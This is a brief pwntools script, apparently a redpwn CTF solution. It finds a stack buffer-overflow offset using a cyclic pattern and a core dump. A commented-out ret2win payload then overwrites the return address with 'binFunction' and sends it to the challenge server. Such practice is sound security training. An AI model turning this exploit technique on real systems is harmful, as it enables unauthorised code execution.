##best so far i have seen 
from pwn import *

p = process('./chall2')

p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.sendline(cyclic(1024,n=8))
p.recvline()
p.wait()
core = p.corefile
p.close()
os.remove(core.file.name)
padding = cyclic_find(core.read(core.rsp, 8),n=8)
print(padding)


'''
binary = ELF('./chall2')
binf = binary.symbols['binFunction']
print(hex(padding), hex(binf))

payload  = padding * b'A'
payload += p64(binf)

p = remote('2020.redpwnc.tf', 31908)
p.recvline()
p.recvline()
p.sendline(payload)
p.interactive()
'''
